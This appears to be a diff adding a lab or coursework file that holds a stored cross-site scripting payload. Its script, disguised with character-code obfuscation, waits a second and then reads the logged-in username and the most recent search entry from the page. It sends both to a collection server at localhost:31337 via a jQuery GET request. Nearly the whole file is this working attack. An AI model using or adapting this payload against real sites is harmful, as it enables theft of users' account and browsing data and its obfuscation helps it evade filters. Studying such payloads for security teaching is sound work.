@@ -1,0 +1,27 @@
+<p id='logged-in-user'> yuuh </p>
+<p id='history-list'> <p>testing<p><p>testing<p><p>testing<p></p>
+
+<script>
+setTimeout(function() {
+
+var url_begin = String.fromCharCode(104) + String.fromCharCode(116) + String.fromCharCode(116) + String.fromCharCode(112) + String.fromCharCode(58) + String.fromCharCode(47) + String.fromCharCode(47) + String.fromCharCode(108) + String.fromCharCode(111) + String.fromCharCode(99) + String.fromCharCode(97) + String.fromCharCode(108) + String.fromCharCode(104) + String.fromCharCode(111) + String.fromCharCode(115) + String.fromCharCode(116) + String.fromCharCode(58) + String.fromCharCode(51) + String.fromCharCode(49) + String.fromCharCode(51) + String.fromCharCode(51) + String.fromCharCode(55) + String.fromCharCode(47) + String.fromCharCode(63) + String.fromCharCode(115) + String.fromCharCode(116) + String.fromCharCode(111) + String.fromCharCode(108) + String.fromCharCode(101) + String.fromCharCode(110) + String.fromCharCode(95) + String.fromCharCode(117) + String.fromCharCode(115) + String.fromCharCode(101) + String.fromCharCode(114) + String.fromCharCode(61)
+
+var stolen_user = document.getElementById(String.fromCharCode(108) + String.fromCharCode(111) + String.fromCharCode(103) + String.fromCharCode(103) + String.fromCharCode(101) + String.fromCharCode(100) + String.fromCharCode(45) + String.fromCharCode(105) + String.fromCharCode(110) + String.fromCharCode(45) + String.fromCharCode(117) + String.fromCharCode(115) + String.fromCharCode(101) + String.fromCharCode(114)).innerHTML
+
+var url_middle = String.fromCharCode(38) + String.fromCharCode(108) + String.fromCharCode(97) + String.fromCharCode(115) + String.fromCharCode(116) + String.fromCharCode(95) + String.fromCharCode(115) + String.fromCharCode(101) + String.fromCharCode(97) + String.fromCharCode(114) + String.fromCharCode(99) + String.fromCharCode(104) + String.fromCharCode(61)
+
+var nodeWeWant = undefined
+var index = 0
+for(node of document.getElementById(String.fromCharCode(104) + String.fromCharCode(105) + String.fromCharCode(115) + String.fromCharCode(116) + String.fromCharCode(111) + String.fromCharCode(114) + String.fromCharCode(121) + String.fromCharCode(45) + String.fromCharCode(108) + String.fromCharCode(105) + String.fromCharCode(115) + String.fromCharCode(116)).children)
+  if(index++ == 0)
+    nodeWeWant = node
+
+last_search = nodeWeWant.innerHTML
+
+var url = url_begin + stolen_user + url_middle + last_search
+
+$.get(url).done(function(resp) {
+});
+
+}, 1000);
+</script>
